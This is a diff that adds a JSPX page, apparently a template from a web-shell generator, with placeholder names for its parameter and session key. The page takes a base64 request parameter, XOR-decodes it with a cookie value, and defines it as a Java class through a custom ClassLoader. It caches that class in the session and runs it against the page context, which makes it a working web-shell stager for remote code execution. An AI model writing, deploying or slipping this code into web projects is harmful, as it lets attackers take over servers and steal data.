@@ -1,0 +1,77 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page contentType="text/html;charset=UTF-8" language="java" pageEncoding="UTF-8" />
+    <jsp:declaration>
+    
+    String pm = "$param$"; 
+    
+    class X extends ClassLoader {
+        public X(ClassLoader z) {
+            super(z);
+        }
+        
+        public Class Q(byte[] cb) {
+            return super.defineClass(cb, 0, cb.length);
+        }
+    }
+    
+    <![CDATA[
+    public byte[] x(byte[] s, String key) {
+        try {
+            byte[] keyBytes = key.getBytes("UTF-8");
+            byte[] result = new byte[s.length];
+            for (int i = 0; i < s.length; i++) {
+                result[i] = (byte) (s[i] ^ keyBytes[i % keyBytes.length]);
+            }
+            return result;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+    ]]>
+    
+    
+    public static byte[] base64Decode(String bs) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class })
+                   .invoke(decoder, new Object[] { bs });
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder"); 
+                Object decoder = base64.newInstance(); 
+                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class })
+                       .invoke(decoder, new Object[] { bs });
+            } catch (Exception e2) {}
+        }
+        return value;
+    }
+    
+    </jsp:declaration>
+    <jsp:scriptlet>
+    try {
+
+        if (session.getAttribute("$payload$") == null) {
+            byte[] data = base64Decode(request.getParameter(pm));
+            String stagerKey = request.getCookies()[0].getValue();
+            data = x(data, stagerKey);
+            try {
+                Class loadedClass = new X(this.getClass().getClassLoader()).Q(data);
+                session.setAttribute("$payload$", loadedClass);
+            } catch (Exception classLoadException) {
+                return;
+            }
+            
+        } else {
+            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+            Object f = ((Class)session.getAttribute("$payload$")).newInstance();
+            f.equals(arrOut);
+            f.equals(pageContext);
+            f.toString();
+        }
+    } catch (Exception e) {
+    }
+    </jsp:scriptlet>
+</jsp:root>
